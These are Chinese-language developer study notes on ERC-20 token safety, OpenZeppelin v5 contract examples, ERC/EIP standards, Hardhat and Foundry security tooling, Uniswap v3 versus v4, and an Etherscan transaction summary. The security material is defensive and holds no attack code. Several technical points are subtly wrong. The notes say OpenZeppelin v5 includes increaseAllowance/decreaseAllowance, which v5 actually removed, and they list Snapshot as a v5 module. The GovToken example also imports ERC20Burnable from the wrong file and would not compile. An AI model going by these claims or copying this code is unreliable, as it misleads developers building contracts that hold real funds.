- **“税费/通缩”代币（transfer 会扣税）**：金额不守恒，许多协议（AMM、金库、桥）若没对接好会出错。  
    ✅ **对策**：处理**到帐值与发送值可能不相等**；或显式拒绝非标准代币。
    
- **不返回 bool 的老 ERC-20**：会在严格调用下 revert。  
    ✅ **对策**：与外部代币交互一律用 **SafeERC20**（包容不规范合约）。
    
- **重入假设**：ERC-20 本身无回调，但与 **ERC-777** 或自定义 Hook 共用时需保持可重入安全（比如转账前后外部交互）。  
    ✅ **对策**：**Checks-Effects-Interactions**、必要时 `ReentrancyGuard`、尽量“先记账再外调”。
    

# 3. 技术栈

- **语言/编译器**：Solidity ^0.8.x（内置溢出检查；性能敏感处可 `unchecked`）
    
- **合约库**：OpenZeppelin Contracts（建议 v5 及以上）
    
    - `ERC20` / `ERC20Permit` / `SafeERC20` / `AccessControl` / `Ownable` / `Pausable` / `Snapshot` / `Votes` 等
        
- **工具链**
    
    - 开发：**Foundry**（forge + cast）或 **Hardhat**（ethers、typechain）
        
    - 安全：**Slither**、**Mythril**、**Echidna**（模糊测试）、**Foundry fuzz**
        
    - 形式化/审计：Certora、Scribble（规范注释 + 静态仪表）
        
- **前端交互**：ethers.js / viem；钱包支持 EIP-712（MetaMask、Safe）
    
- **签名授权**：EIP-712（Typed Data） + EIP-2612 或 Permit2
    

# 4. OpenZeppelin v5

### 4.1 最小安全基线（含增减额度 API）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    constructor(string memory n, string memory s, uint256 initial)
        ERC20(n, s)
    {
        _mint(msg.sender, initial);
    }

    // OZ v5 已内置 increaseAllowance / decreaseAllowance（通过 ERC20 扩展）
    // 使用前端引导：优先使用 permit，fallback 到 increase/decrease
}
```

**重点**

- **Solidity 0.8+** 内置溢出检查，耗气场景可在不影响安全的自增/自减里用 `unchecked`。
    
- **OpenZeppelin v5** 对内部结构做了清理与优化（见 6 节），默认实现已包含 best-practice。
    

### 4.2 加入 Permit（EIP-2612）

```solidity
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract MyPermitToken is ERC20, ERC20Permit {
    constructor(uint256 initial)
        ERC20("MyPermitToken", "MPT")
        ERC20Permit("MyPermitToken") // EIP-712 Domain(name, version, chainId, verifyingContract)
    {
        _mint(msg.sender, initial);
    }
}
```

**重点**

- 用钱包弹窗签名（EIP-712 typed data），合约侧 `permit(owner, spender, value, deadline, v, r, s)` 写入 `nonces` 与 `allowance`。
    
- 前端**一笔交易**即可完成授权+业务；显著改善 UX 与 Gas。
    

### 4.3 金库/治理/黑天鹅控制（可选扩展）

- **可暂停（Pausable）**：黑天鹅或审计发现漏洞时快速止血
    
- **快照（Snapshot）**：治理/分红场景的历史余额证明
    
- **访问控制（Ownable/AccessControl）**：铸造、回收、白名单管控
    
- **投票（Votes）**：余额 → 治理权重（与快照语义一致）
    

```solidity
pragma solidity ^0.8.20;

import {ERC20, ERC20Burnable, ERC20Pausable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract GovToken is ERC20, ERC20Burnable, ERC20Pausable, Ownable {
    constructor() ERC20("GovToken", "GOV") Ownable(msg.sender) {
        _mint(msg.sender, 1_000_000e18);
    }

    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }

    // 钩子在 v5 中通过内部 _update 统一调用（见第 6 节）
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable)
    {
        super._update(from, to, value);
    }
}
```

# 5. ERC-20 交互的“协议侧”

- **使用 `SafeERC20`**（可兼容不返回 bool 的“古董币”）    
- 留心**到帐量**与**发送量**不一致的“税费代币”    
- 对接 **Permit/Permit2**，减少一次 `approve` 交易    

```solidity
pragma solidity ^0.8.20;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Vault {
    using SafeERC20 for IERC20;
    IERC20 public immutable asset;

    constructor(IERC20 _asset) { asset = _asset; }

    function deposit(uint256 amt) external {
        uint256 beforeBal = asset.balanceOf(address(this));
        asset.safeTransferFrom(msg.sender, address(this), amt);
        uint256 received = asset.balanceOf(address(this)) - beforeBal; // 税费代币差额
        // 按 received 记账，避免金额错配
    }
}
```

# 6. OpenZeppelin v5 “代码层面的变化/优化”
- **Hooks 重构为 `_update` 统一入口**：  
    以前常见 `_beforeTokenTransfer/_afterTokenTransfer` 已在 v5 中被**统一为** `ERC20._update(from, to, value)`。
    
    - 你如果需要在转账/铸造/销毁时插入控制逻辑，**重写 `_update`**（就像上面 `Pausable` 的 override）。
        
- **更一致的自定义错误与 Gas 优化**：
    
    - v5 广泛使用 **custom errors**、去除历史包袱（不再需要 SafeMath）。
        
    - 一些内部函数布局更利于内联与 `unchecked` 性能优化。
        
- **扩展模块解耦更清晰**：
    
    - `ERC20Permit`、`ERC20Votes`、`Snapshot` 等各司其职，组合更直观。
        
- **默认实现更“安全保守”**：
    
    - 例如 `increaseAllowance`/`decreaseAllowance` 早已内建，官方推荐替代直接改写 `approve` 的模式。
        

# 7. Gas/存储优化清单

- **`immutable`**：代币的不可变参数（如金库的底层资产地址）用 `immutable`，读成本低。
    
- **`unchecked`**：仅在你**绝对确认**不溢出的地方使用（如 `totalSupply += amount` 紧跟 `require`）。
    
- **事件索引**：`Transfer/Approval` 的 indexed 字段已固定；自定义事件控制 `indexed` 数量（过多索引会加日志成本）。
    
- **Slot 打包**：`mapping` 无法与其它状态变量打包；但常量/少量 config 可放一个 struct 里一起布局（收益有限，别过度优化）。
    
- **外部调用最小化**：批量转账尽量在调用方循环而不是被调用方多次回调（协议设计层面优化）。
    

# 8. 与“更上一层”的标准/组件协同

- **EIP-2612（Permit）**：签名授权，提升 UX；强烈建议你的代币和协议**同时支持**。
    
- **Permit2（Uniswap 工具合约）**：一个合约集中管理授权与签名核销，**跨代币/跨合约**统一；协议方集成最省心。
    
- **EIP-4626（金库/Vault）**：如果你的 ERC-20 是**收益凭证**或**份额代币**，用 4626 统一“资产↔份额”换算，DeFi 可组合性大增。
    
- **EIP-712（Typed Data）**：所有签名（Permit / off-chain order / meta-tx）底层都用它；前端与钱包交互标准化。
    

# 9. ERC-20 + Permit + Ownable + Pausable

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20Pausable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AppToken is ERC20, ERC20Permit, ERC20Pausable, Ownable {
    constructor(uint256 init)
        ERC20("AppToken", "APP")
        ERC20Permit("AppToken")
        Ownable(msg.sender)
    {
        _mint(msg.sender, init);
    }

    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }

    // v5：统一从这里拦截所有转账/铸销逻辑（Pausable 已在 super 里处理）
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable)
    {
        // 风控/黑名单/限频等也可写在这里（注意 gas & 误触发）
        super._update(from, to, value);
    }
}
```

# 10. 测试与审计清单(理解成软测)

- **单元测试**：正/反路径、边界（0 值、极大值）、授权 race、税费代币模拟、Permit 非法签名/过期
    
- **模糊测试**（Foundry `forge test --fuzz` / Echidna）：针对 `transfer/transferFrom` 不变量（守恒）、总供给不变（除非铸销）
    
- **静态分析**：Slither（未用返回值、可重入、可见性、不必要存储写）
    
- **Gas 对比**：Foundry `--gas-report`；对 `_update` 里自定义逻辑做 A/B

# 2025-08-18

# 🔑 1. ERC-20（EIP-20）

### 简介

- 以太坊最早的同质化代币标准（2015/2017），定义了代币的基本接口：`balanceOf`、`transfer`、`approve`、`transferFrom` 等。
    

### 解决的问题

- 在 ERC-20 之前，每个项目自定义代币合约接口，缺乏统一标准，钱包/交易所难以兼容。
    
- ERC-20 **统一了代币接口** → 任何钱包、DEX、DeFi 协议都能无缝集成。
    

### 技术栈 / 更新

- **Solidity**：主要语言。
    
- **OpenZeppelin Contracts** 提供成熟安全的 ERC-20 实现（含 Mintable、Burnable、Snapshot、Pausable 扩展）。
    
- 技术更新：支持 **EIP-2612 permit** 扩展（避免多次交易），以及 ERC-777 的改进尝试（但 ERC-777 因复杂性和攻击面大，采用度有限）。
    



# 🎨 2. ERC-721（EIP-721）

### 简介

- 非同质化代币（NFT）标准，定义了 `ownerOf`、`transferFrom`、`safeTransferFrom` 等接口。
    

### 解决的问题

- ERC-20 只能表示同质化资产（如稳定币），无法表示唯一资产。
    
- ERC-721 解决了 **唯一性、所有权证明、资产上链** 问题（CryptoKitties、艺术品、游戏资产）。
    

### 技术栈 / 更新

- **Solidity + OpenZeppelin**：ERC721 标准合约。
    
- **EIP-165**：接口检测标准，用于确认合约是否实现 ERC721。
    
- 技术更新：出现 **ERC-721A**（优化 gas 的批量 Mint，Azuki 提出）和 **ERC-4907**（租赁扩展）。
    
- 在 DeFi 场景：NFT 可作为抵押物（NFTfi）、流动性凭证（Uniswap v3 LP NFT）。
    



# 🎭 3. ERC-1155（EIP-1155）

### 简介

- 多资产标准（Enjin 提出），允许一个合约管理 **同质化代币 + 非同质化代币**。
    

### 解决的问题

- ERC-20 & ERC-721 **各自独立**，管理复杂、部署成本高。
    
- ERC-1155 解决了：
    
    - 批量转账/管理 → 节省 Gas。
        
    - 同一合约下管理多种资产（游戏资产、DeFi 多资产组合）。
        

### 技术栈 / 更新

- **Solidity + OpenZeppelin**：ERC1155 实现。
    
- 技术更新：批量 `safeBatchTransferFrom`，显著降低 Gas。
    
- 应用：DeFi 衍生品（如 Synthetix 的多资产发行）、GameFi。
    



# 💰 4. ERC-4626（EIP-4626）

### 简介

- Vault（收益金库）代币标准，用于将任意 ERC-20 资产托管并发行份额代币（Vault Token）。
    

### 解决的问题

- 在 DeFi 中，Yearn、Aave、Compound 等 Vault/借贷协议的接口不统一。
    
- ERC-4626 **统一 Vault 的存取/份额逻辑**：
    
    - `deposit`、`withdraw`、`mint`、`redeem`。
        
    - 提升了协议间的 **可组合性**。
        

### 技术栈 / 更新

- **Solidity + OpenZeppelin ERC4626** 模块化实现。
    
- 技术更新：
    
    - 更高效的资产与份额转换（`convertToAssets`、`convertToShares`）。
        
    - 与 Uniswap V3、Aave 等生态组合，提升自动化策略（自动收益聚合）。
        



# ⚡ 5. EIP-2612（ERC-20 Permit）

### 简介

- ERC-20 的扩展，引入 `permit()`，允许用户通过签名授权，不必提前发送 `approve` 交易。
    

### 解决的问题

- 传统 ERC-20 流程：`approve` → `transferFrom`，需要 **两次交易**，增加成本和 UX 不佳。
    
- EIP-2612：一次链下签名，合约即可直接调用 → 减少一次交易、节省 Gas。
    
- 被广泛应用于 DEX（Uniswap、Curve）、聚合器（1inch）。
    

### 技术栈 / 更新

- **Solidity** + **EIP-712（Typed Signature）** 实现。
    
- **OpenZeppelin ERC20Permit** 库现成可用。
    
- 技术更新：Uniswap 的 **Permit2** 进一步增强安全性，支持多合约统一授权。
    



# 🔐 6. EIP-712

### 简介

- 结构化数据签名标准，用于安全地链下签名并链上验证。
    

### 解决的问题

- 普通签名（EIP-191）仅是字节串，用户难以验证签名含义，容易被钓鱼。
    
- EIP-712 让用户在钱包（如 MetaMask）看到清晰的待签名数据结构 → **可读性 & 安全性**。
    

### 技术栈 / 更新

- **TypedData hashing + Solidity keccak256**。
    
- 钱包支持：MetaMask、Gnosis Safe。
    
- 技术更新：DeFi 广泛使用（0x 协议、Permit、LayerZero、跨链消息）。
    
- 在 DeFi 中结合 **EIP-2612**，几乎成为标配。
    



# ✅ 差别

|标准|简介|解决的问题|技术栈 / 更新|
|---|---|---|---|
|ERC-20|同质化代币标准|代币接口统一，钱包/DEX 通用|Solidity + OpenZeppelin；扩展：ERC777、EIP-2612|
|ERC-721|NFT 标准|表达唯一资产|Solidity + OpenZeppelin；扩展：ERC721A、ERC4907|
|ERC-1155|多资产标准|批量管理、多资产共存|Solidity + OpenZeppelin；批量转账省 Gas|
|ERC-4626|Vault 标准|统一收益金库接口|Solidity + OpenZeppelin ERC4626；提高可组合性|
|EIP-2612|ERC20 Permit|减少 approve 步骤|Solidity + EIP-712；OpenZeppelin ERC20Permit；Permit2|
|EIP-712|Typed Data 签名|提升签名安全性|Solidity hashing；钱包支持广泛|

# 2025-08-17

# 一、Hardhat和Foundry

- **Hardhat**：以 Node.js 生态为核心的“脚手架 + 本地区块链 + 海量插件”平台，最强在**插件生态、部署编排、与前端/TS 工程体系的整合**。
    
- **Foundry**：Rust 实现的**高性能 Solidity 原生开发套件**（forge/cast/anvil）。最强在**编译/测试速度、内置模糊/不变式测试、低摩擦链上脚本化**。
    

# 二、特性对比（工程视角）

|维度|Hardhat|Foundry|
|---|---|---|
|主要语言/脚本|TypeScript/JavaScript（测试、任务、部署脚本）|Solidity（测试、脚本）+ `cast` CLI|
|本地链|Hardhat Network（主网分叉稳定、插件多）|Anvil（启动快、资源占用低、分叉快）|
|编译与速度|基于 `solc`，速度中等，依赖 Node 生态|并行编译，普遍更快；缓存机制优秀|
|测试形态|Mocha/Chai + ethers.js/viem（从“用户视角”写测试）|Solidity 原生单测，Cheatcodes 丰富，天然“合约内视角”|
|Fuzz/Invariant|依赖外部工具（Echidna 等）或插件集成|**内置** fuzz/invariant 与 shrink，易上手|
|Gas 工具|`hardhat-gas-reporter` 等插件|`forge test --gas-report`、`forge snapshot`|
|覆盖率|`solidity-coverage` 插件成熟|`forge coverage`（现已可用，集成度高）|
|调试体验|`hardhat/console.sol`、详细 error 堆栈、任务系统|`-vvvv` 级别调用追踪、`console2`、Cheatcodes（`prank/deal/warp` 等）|
|依赖管理|npm/pnpm/yarn|`forge install`（git 源）+ remappings|
|插件生态|**极其丰富**（部署、验证、升级、Defender…）|相对轻；更多“内建”而非“插件化”|
|与前端集成|**一流**（TS 类型提示、viem/wagmi、任务式部署产物）|可行但更“工具箱化”，常与 Hardhat/前端仓分离|
|CI/DevOps|基于 Node 工具链，模板众多|二进制工具，CI 速度快、镜像小|

> 选择：
> 
> - **以 DApp/前端驱动、依赖插件和部署编排** → 选 **Hardhat** 或 **Hardhat+Foundry** 混合。
>     
> - **以研究/安全/性能与测试为中心** → 选 **Foundry** 主导。
>     

# 三、选择

常见高效组合：

- **Foundry 负责：** 编译、单测、fuzz、不变式、gas 回归；
    
- **Hardhat 负责：** 多网络部署、Etherscan/区块浏览器验证、与前端/脚本任务编排、OpenZeppelin Upgrades 等插件链路。  
    做法：同一仓或 mono-repo 中，保留 `foundry.toml` 与 `hardhat.config.ts`，合约源码共享，CI 中分别跑 `forge test` 与 `hardhat deploy/verify`。
    

# 四、安全技术栈

## 1) Hardhat 安全栈

**内核理念：** “插件驱动 + 外部安全工具的无缝集成 + 主网分叉回归”。

- **基线库**
    
    - **OpenZeppelin Contracts**（安全基元、权限/代币/代理模式）
        
    - OpenZeppelin **Upgrades** 插件（Transparent/UUPS 代理、**存储布局检查**）
        
- **静态分析**
    
    - **Slither**（Python，静态分析、漏洞检测、结构报告、脚本化审计）
        
    - Solhint（风格/易错点 Lint）
        
- **属性/规约与形式化**
    
    - **Scribble**（规范注释 → 仪表化断言，可与 Hardhat 流程集成）
        
    - **Certora Prover**（规则级形式化验证；对关键合约很有价值）
        
- **模糊/符号执行**
    
    - **Echidna**（基于性质的模糊测试）
        
    - Mythril / Manticore（符号执行；更偏“审计/研究”）
        
- **覆盖率与 gas**
    
    - `solidity-coverage`、`hardhat-gas-reporter`
        
- **运行时与回归**
    
    - Hardhat Network **主网分叉**（对 DeFi/跨协议交互尤为重要）
        
    - Defender（Sentinel/AutoTasks/Timelock/多签工作流）
        
- **最佳实践**
    
    - 升级合约：强制存储布局 Diff、冻结不可变变量、独立 `initialize` 访问控制
        
    - 多签、延时（Timelock）与角色最小化；事件审计与**变更公告**流程
        

## 2) Foundry 安全栈

**内核理念：** “把安全测试做成默认路径：快、原生、可编排”。

- **内置能力（无需额外工具即上强度）**
    
    - **Fuzz/Invariant**：`forge test` 直接开启；`targetSelectors`/`targetContracts` 配置；Shrinking 默认支持
        
    - **Cheatcodes**：`prank/warp/roll/deal/record/revertTo` 等模拟权限、时间、随机性与链上状态
        
    - **Gas/Trace**：`--gas-report`、`-vvvv` 深度调用轨迹
        
    - **Coverage**：`forge coverage`
        
    - **Scripts**：`forge script --broadcast` 安全复现部署步骤、支持 Dry-run 与模拟
        
- **可叠加的外部工具**
    
    - 同样可无缝接入 **Slither、Echidna、Scribble、Certora**（很多审计团队就是 Foundry+Slither/Echidna 的组合）
        
- **测试范式**
    
    - **不变式测试**（Invariants）→ 对 DeFi 等状态机强约束非常有效（如“系统总余额守恒”、“永不出现负债爆表”）
        
    - **差分测试**（与参考实现或旧版本对比）
        
    - **主网分叉**：`anvil --fork-url` + `forge test` 在真实协议上下文中 fuzz
        
- **最佳实践**
    
    - 为关键不变量写“**最小可复现攻击面**”测试（单次交易 + 多 tx 序列）
        
    - 为权限逻辑写“反向”用例（恶意调用者、错误角色、EOA/合约混合）
        

# 五、端到端的安全流程

1. **编码前**：选用 **OZ Contracts** 基元；定稿**信任模型**与**升级策略**（是否可升级？由谁升级？是否 Timelock/多签？）。
    
2. **静态检查**：Solhint + **Slither** 基线扫描；定制 Slither 脚本做结构性检查（如授权点、外部可重入点）。
    
3. **单元/集成测试**：
    
    - Hardhat：Mocha/Chai + viem/ethers 写“用户视角”流程；
        
    - Foundry：Solidity 单测覆盖“合约内细节与边界”。
        
4. **Fuzz / Invariant**：
    
    - Hardhat：引入 **Echidna** 或把合约仪表化（Scribble）后跑；
        
    - Foundry：直接用内置 fuzz/invariant（推荐，把性质写清楚）。
        
5. **主网分叉回归**：模拟真实协议外部交互（预言机、Dex、借贷），验证经济安全与沙盒参数。
    
6. **形式化关键路径**：对资金关键模块用 **Scribble** 断言或 **Certora** 规则做“证明级”保障。
    
7. **覆盖率 & Gas 回归**：将覆盖率和 gas 预算纳入 CI 阈值（PR 降级即阻断）。
    
8. **部署/运维安全**：
    
    - 可升级合约强制存储布局对比；
        
    - 多签/Timelock；
        
    - **Etherscan/Blockscout 验证** + 生成 SBOM（依赖清单）；
        
    - 线上 **监控与告警**（Defender Sentinel、事件订阅）。
        
9. **应急预案**：暂停开关（可控可见）、速撤流动性/参数限制脚本、公告模板与回滚计划。
    

# 六、如何选择（网上建议）

- **偏应用/前端协作/插件链路**重：**Hardhat**（或 Hardhat 做部署，Foundry 做测试）。
    
- **偏安全/研究/高覆盖测试**重：**Foundry** 主导，必要时加上 Hardhat 的部署插件链路。
    
- **团队 TS 很强**、与前端复用类型/工具：**Hardhat**
    
- **团队以审计/协议为中心**、强调 fuzz/invariant 与高频回归：**Foundry**

# 2025-08-15

# Uniswap

- **v3（2021）**：提出“**集中流动性**”（LP 可把资金只投在自选价区），并配合多费率档、NFT 头寸与内置 TWAP 预言机，显著提升资金效率与可组合性。([Uniswap文档](https://docs.uniswap.org/concepts/protocol/concentrated-liquidity?utm_source=chatgpt.com "Concentrated Liquidity"), [app.uniswap.org](https://app.uniswap.org/whitepaper-v3.pdf?utm_source=chatgpt.com "Uniswap v3 Core"))
    
- **v4（2025）**：在延续 v3 资金效率的基础上，换成 **Singleton** 架构 + **Flash Accounting**（净额结算）+ **Hooks** 可编程扩展；费用从固定档变为 **0–100% 可配置/可动态**；支持 **原生 ETH**（无需先包成 WETH）。
    


|       | v3                       | v4                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----- | ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 合约架构  | Factory + 每个池都是独立合约      | **单合约 PoolManager（Singleton）** 管全部池状态，创建/多跳更省 Gas。                                                                                                                                                                                                                                                                                                                                                                    |
| 资金效率  | **集中流动性**（LP 指定价区）       | 继承 v3 的集中流动性机制。                                                                                                                                                                                                                                                                                                                                                                                                       |
| 费用机制  | 固定档（0.01%、0.05%、0.3%、1%） | **可配置费率（0–100%）**，可静态或由 **Hook 动态**决定。([Uniswap文档](https://docs.uniswap.org/concepts/protocol/fees?utm_source=chatgpt.com "Fees"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))                                                                                                                                                       |
| 结算与转账 | 每跳都真实转账，跨多池成本高           | **Flash Accounting**，交易末尾按净额结算，跨池更省 Gas；附带“**免费闪电贷**”性质。([Uniswap文档](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [Uniswap Labs](https://blog.uniswap.org/uniswap-v4?utm_source=chatgpt.com "Our Vision for Uniswap v4"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit")) |
| 原生资产  | 需 WETH/WMATIC 包装         | **原生 ETH 直用**，用户体验更好。                                                                                                                                                                                                                                                                                                                                                                                                 |
| 可编程性  | 协议内置功能为主                 | **Hooks**：在建池/加减仓/换汇等生命周期“前/后”插入自定义逻辑（限价单、定制预言机、费用管理、做市策略等）。                                                                                                                                                                                                                                                                                                                                                          |
| 头寸表示  | 每个 LP 头寸是 **ERC-721**    | 仍由 **v4 PositionManager 铸造/管理 ERC-721 头寸**；但结算层引入 **ERC-6909** 做内部记账与赎回优化。                                                                                                                                                                                                                                                                                                                                            |
| 预言机   | **内置 TWAP 预言机**（池可直接出价）  | **不再内置预言机**；如需可由 Hook 定制。                                                                                                                                                                                                                                                                                                                                                                                             |
| 范式/路由 | v3 Router + SDK          | **Universal Router + v4 SDK**，支持 v4 的新结算/Hook 语义。(                                                                                                                                                                                                                                                                                                                                                                    |

> 备注：**Range Orders（区间单）** 在 v3/v4 语义一致，都是用“单边集中流动性 + 价区穿越”来近似限价单。

# v4 的关键技术点（为什么更“灵活+低 Gas”）

1. **Singleton + Flash Accounting**  
    全池状态集中到 `PoolManager`；一次交易内先用**瞬时状态**记账（受 EIP-1153/Transient Storage 设计启发），最后统一结算，跨多池/多步操作显著省 Gas，并天然形成“**净额结算/免费闪电贷**”特性。([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswap文档](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))    
2. **Hooks（池级可编程）**  
    在建池、swap、modifyLiquidity、donate 等前/后插点执行外部合约，实现**动态费率、做市策略、预言机、风控/合规模块**等；是 v4 的可扩展核心。
3. **费用与会计完全可定制**  
    费率范围 0–100%，静态或由 Hook 每笔动态设定；配合 **Custom Accounting/Return Deltas** 可实现复杂经济模型。([blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"), [Uniswap文档](https://docs.uniswap.org/contracts/v4/guides/custom-accounting?utm_source=chatgpt.com "Custom Accounting | Uniswap"))    
4. **原生 ETH 支持**  
    路由/PoolKey 直接标识 ETH，减少 wrap/unwrap 成本与边界复杂度。
5. **ERC-6909 内部记账**  
    与 Flash Accounting 协同，允许在 `PoolManager` 内以多 token-id 形式记账、赎回/归还，进一步压低赎回/领取 Gas。
    

# 2024–2025

- **主网上线 & 多链部署**：**2025-01-31** v4 正式发布，**以太坊、Polygon、Arbitrum、OP Mainnet、Base、BNB、Blast、World Chain、Avalanche、Zora** 等链可用。([Uniswap Labs](https://blog.uniswap.org/uniswap-v4-is-here?utm_source=chatgpt.com "Uniswap v4 is Here – A New Era of DeFi"))    
- **安全与审计**：上线前组织了**多轮审计/竞赛**与 **$15.5M** 赏金；独立审计报告也剖析了 **Flash Accounting“免费闪电贷”** 与 **ERC-6909 结算** 的安全注意点。([Uniswap Labs](https://blog.uniswap.org/v4-bug-bounty?utm_source=chatgpt.com "$15.5M Bug Bounty for Uniswap v4: The Largest in History"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))
- **数据与分析迁移**：因 **Singleton** 与新记账范式，v4 的链上数据抓取/查询方式与 v3 有明显不同（研究者/分析师需更新方法）。([uniswapfoundation.mirror.xyz](https://uniswapfoundation.mirror.xyz/c7LDDTWhC2ry6gp0nGqcSKHvNHosJmhPQ-ZuIxqeB2I?utm_source=chatgpt.com "How to Navigate Uniswap v4 Data"))    
- **开发生态**：发布 **v4 SDK** 与 **Universal Router** 文档/示例，同时官方/社区给出 Hook 模板与实践指引（如 BaseHook、风控/积分/动态费率 Hook 等）。([Uniswap文档](https://docs.uniswap.org/sdk/v4/overview?utm_source=chatgpt.com "The Uniswap v4 SDK"))    
- **许可与合规**：    
    - v3：最初 BUSL，后已转 **GPL**（可自由复刻，遵守 GPL 即可）。([support.uniswap.org](https://support.uniswap.org/hc/en-us/articles/14569783029645-Uniswap-v3-licensing?utm_source=chatgpt.com "Uniswap v3 licensing"))        
    - v4：**BUSL-1.1/双许可**（部分文件 MIT），随时间转为更宽松许可；DAO 对例外授权/流程有专门讨论。([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswap Governance](https://gov.uniswap.org/t/establish-uniswap-v4-licensing-process/25443?utm_source=chatgpt.com "Establish Uniswap v4 Licensing Process"))

# 2025-08-14

# OpenZeppelin
以太坊/EVM 生态最主流的智能合约标准库：把 ERC20/721/1155 等标准实现、权限与治理、可升级基建和大量安全组件做成了可复用的模块，目标是“在经过社区验证的代码之上安全开发”。([OpenZeppelin 文档](https://docs.openzeppelin.com/contracts/5.x/?utm_source=chatgpt.com "Contracts - OpenZeppelin Docs"))

# 如何确保合约安全

1. **标准化与社区验证**  
    大量核心合约（ERC20/721 等）与工具长期在社区中被复用与审视，官方定位就是“为安全合约开发而建的库”。这能显著降低自写轮子的安全风险。
    
2. **内置防御组件，覆盖高频攻击面**    
    - `ReentrancyGuard`：一键给关键函数加防重入护栏。        
    - `Pausable`：紧急制动（circuit breaker），事故发生时可临时冻结敏感操作。        
    - `PullPayment`：把“主动转账”改为“受方主动提取”，规避常见重入陷阱。  
        这些模式都是围绕实际攻击面沉淀下来的“安全缺省”。
        
3. **与“不规范代币”的安全交互**  
    生态里一些 ERC-20 合约不按规范返回 `bool`（如 USDT 早期实现）。`SafeERC20` 对 `transfer/transferFrom/approve` 做了安全封装，统一处理异常与返回值，避免硬编码处理出错。
    
4. **类型与数学安全**  
    提供 `SafeCast`、`Math` 等工具，避免静默截断、下溢/上溢等数值类问题（Solidity 新版本已自带溢出检查，但边界与类型转换仍需小心）
    
5. **权限与治理的系统化设计**    
    - `Ownable/AccessControl` 与 **`AccessManager`**：从单管理员到多角色分权，甚至可为角色配置**执行延迟**与跨合约权限，防止“钥匙一把抓”。        
    - `TimelockController`：对关键操作加**时间延迟**，给社区或用户留出观察/退出窗口，是去中心化治理的安全常识。  
        这些组合能把“权限误用/恶意”的系统性风险降到最低。
        
6. **可升级合约的“安全护栏”**  
    升级插件在部署与升级时会**自动做两类校验**：    
    - **升级安全性**（如是否使用了 constructor、是否正确初始化等）；        
    - **存储布局兼容性**（防止变量顺序/类型变更导致的数据“错位”）。  
        校验不过就阻止升级，避免生产事故。
        
7. **审计与安全研究背书**  
    OpenZeppelin ，维护库，也提供行业头部的安全审计服务：多研究员交叉审阅，必要时做模糊/不变式测试；官方披露了**700+审计、8000+问题发现**的统计量，长期把研究结论反哺到库与文档。
    
8. **密码学与签名标准的落地实现**  
    提供 `EIP712` 等密码学工具/接口，帮助你用标准化方式处理签名与域隔离，减少重放与签名滥用的风险。
    
## 常见风险 → 对应方案

- 重入攻击 → `ReentrancyGuard` 或改用 `PullPayment`。    
- 管理员误操作/单点风险 → `AccessManager/AccessControl` + `TimelockController`（必要时叠加多签）。
- 紧急漏洞爆发 → `Pausable` 临时冻结敏感功能，赢得修复窗口。    
- 升级把状态搞乱 → 使用升级插件的**升级/存储布局校验**。
- 与“非标准”ERC-20 交互失败 → 统一用 `SafeERC20` 封装。

# 2025-08-12

# Etherscan内容分析

| 字段                          | 内容                                                                   |
| --------------------------- | -------------------------------------------------------------------- |
| **交易哈希 (Transaction Hash)** | `0x494dc66209465c96204d59005b0bf9e9b5ce5dd2c0c09de3394f396724a932de` |
| **状态 (Status)**             | ✅ 成功 (Success)                                                       |
| **所在区块 (Block)**            | `8967679`（已确认 471 个区块）                                               |
| **时间戳 (Timestamp)**         | `2025-08-12 10:32:36 AM UTC`（约 1 小时前）                                |
| **发送方 (From)**              | `0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8`                         |
| **接收方 (To, 合约地址)**          | `0x1888eED3F821558f8aAe128EcFb0224B86FFdD49`                         |
| **交易类型 (Txn Type)**         | Type 2 (EIP-1559)                                                    |
| **Nonce**                   | 3                                                                    |
| **区块内位置**                   | 27                                                                   |

| 项目                                 | 数值                                    |
| ---------------------------------- | ------------------------------------- |
| **转账金额 (Value)**                   | `0 ETH`（此交易仅调用合约函数，无资金转移）             |
| **交易手续费 (Transaction Fee)**        | `0.00000792154930663 ETH`             |
| **Gas 价格 (Gas Price)**             | `1.501004132 Gwei`                    |
